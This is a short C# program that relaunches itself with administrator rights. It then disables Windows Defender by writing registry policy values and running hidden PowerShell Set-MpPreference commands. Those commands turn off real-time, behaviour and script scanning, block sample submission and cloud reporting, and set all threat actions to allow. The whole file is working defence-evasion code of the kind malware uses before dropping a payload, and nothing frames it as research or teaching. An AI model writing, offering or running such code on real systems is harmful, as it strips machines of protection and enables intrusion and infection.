using System;
using System.Diagnostics;
using Microsoft.Win32;
using System.Security.Principal;

class Program
{
    static void Main()
    {
        if (!IsUserAnAdmin())
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.Verb = "runas";
            startInfo.FileName = Environment.GetCommandLineArgs()[0];
            startInfo.Arguments = "/admin";
            Process.Start(startInfo);
            return;
        }

        try
        {
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);

            RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true);
            if (key != null)
            {
                key.SetValue("DisableBehaviorMonitoring", 1, RegistryValueKind.DWord);
                key.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                key.SetValue("DisableScanOnRealtimeEnable", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRawWriteNotification", 1, RegistryValueKind.DWord);
                key.SetValue("DisableIOAVProtection", 1, RegistryValueKind.DWord);
                key.Close();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }

        RunPowerShellCommand("Set-MpPreference -DisableRealtimeMonitoring $true");
        RunPowerShellCommand("Set-MpPreference -DisableBehaviorMonitoring $true");
        RunPowerShellCommand("Set-MpPreference -DisableBlockAtFirstSeen $true");
        RunPowerShellCommand("Set-MpPreference -DisableIOAVProtection $true");
        RunPowerShellCommand("Set-MpPreference -DisableScriptScanning $true");
        RunPowerShellCommand("Set-MpPreference -SubmitSamplesConsent 2");
        RunPowerShellCommand("Set-MpPreference -MAPSReporting 0");
        RunPowerShellCommand("Set-MpPreference -HighThreatDefaultAction 6 -Force");
        RunPowerShellCommand("Set-MpPreference -ModerateThreatDefaultAction 6");
        RunPowerShellCommand("Set-MpPreference -LowThreatDefaultAction 6");
        RunPowerShellCommand("Set-MpPreference -SevereThreatDefaultAction 6");
    }

    static void RunPowerShellCommand(string command)
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "powershell.exe";
        startInfo.Arguments = $"-Command \"{command}\""; // Use $ to ensure the command is properly formatted
        startInfo.UseShellExecute = false;
        startInfo.CreateNoWindow = true;
        startInfo.RedirectStandardOutput = true;
        Process process = new Process();
        process.StartInfo = startInfo;
        process.Start();
        process.WaitForExit();
    }

    static bool IsUserAnAdmin()
    {
        try
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch
        {
            return false;
        }
    }
}
